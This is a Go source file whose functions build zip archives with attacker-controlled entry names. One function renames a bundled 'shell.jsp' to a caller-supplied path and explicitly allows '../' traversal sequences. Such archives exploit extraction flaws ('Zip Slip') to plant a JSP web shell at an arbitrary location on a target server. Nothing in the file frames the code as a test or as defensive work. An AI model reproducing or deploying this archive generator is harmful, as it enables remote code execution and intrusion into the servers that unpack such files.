package main

import (
	"archive/zip"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
)

// CreateZipFile ...
func CreateZipFile(DestFile string, SourceFile string, Path string) {
	zipFile, err := os.OpenFile(DestFile, os.O_CREATE|os.O_RDWR, os.ModePerm)
	if err != nil {
		panic(err)
	}
	defer zipFile.Close()
	archive := zip.NewWriter(zipFile)
	defer archive.Close()
	filepath.Walk(SourceFile, func(path string, info os.FileInfo, err error) error {
		CheckErrorOnExit(err)
		header, err := zip.FileInfoHeader(info)
		CheckErrorOnExit(err)
		header.Name = Path
		header.Method = zip.Deflate
		writer, err := archive.CreateHeader(header)
		CheckErrorOnExit(err)
		file, err := os.Open(path)
		CheckErrorOnExit(err)
		defer file.Close()
		_, err = io.Copy(writer, file)
		CheckErrorOnExit(err)
		return err
	})
}

// Zip ...
func Zip(srcFile string, destZip string, pathDest string) error {
	zipfile, err := os.Create(destZip)
	if err != nil {
		return err
	}
	defer zipfile.Close()

	archive := zip.NewWriter(zipfile)
	defer archive.Close()

	filepath.Walk(srcFile, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		header.Name = strings.TrimPrefix(path, filepath.Dir(srcFile)+"/")
		// header.Name = path

		if strings.Contains(header.Name, "shell.jsp") {
			header.Name = strings.ReplaceAll(header.Name, "shell.jsp", pathDest)
		}
		if strings.Contains(header.Name, "../") || strings.Contains(header.Name, "..\\") {
			header.Method = zip.Deflate
		} else {
			if info.IsDir() {
				header.Name += "/"
			} else {
				header.Method = zip.Deflate
			}
		}

		log.Println("header.Name -> ", header.Name)
		writer, err := archive.CreateHeader(header)
		if err != nil {
			return err
		}

		if !info.IsDir() {
			file, err := os.Open(path)
			if err != nil {
				return err
			}
			defer file.Close()
			_, err = io.Copy(writer, file)
		}
		return err
	})

	return err
}
